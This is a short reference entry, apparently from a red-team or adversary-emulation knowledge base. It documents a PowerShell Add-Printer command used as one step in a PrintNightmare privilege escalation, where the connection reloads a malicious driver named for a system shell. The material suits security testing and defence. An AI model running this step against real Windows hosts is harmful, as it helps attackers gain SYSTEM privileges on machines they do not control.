---
id: 3c63081f-3814-4f7b-9cfb-ccfd404a9974
name: add-printer-connection
type: command
executor: powershell
data: Add-Printer -ConnectionName $_FULL_PRINTER_NAME
output: null
created_at: '2023-04-06T03:56:29.867413+00:00'
updated_at: '2023-04-10T20:37:34.442831+00:00'
platforms:
  - Windows
tags:
  - printer-nightmare
  - escalation
verified: true
validated: true
---

# add-printer-connection

## Command

```powershell
Add-Printer -ConnectionName $_FULL_PRINTER_NAME
```

## Description

Adds a printer connection using a UNC path, triggering the Print Spooler to load the associated driver. In PrinterNightmare, this reloads the malicious driver for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_FULL_PRINTER_NAME | UNC path to printer (e.g., '\\host\EasySystemShell - x64') | Yes |

## Examples

### Basic Usage

```powershell
Add-Printer -ConnectionName '\\printer-installed-host\EasySystemShell - x64'
```

## Expected Output

No output if successful; printer appears in list.

## Related

- [[procedures/PrinterNightmare-Privilege-Escalation]]
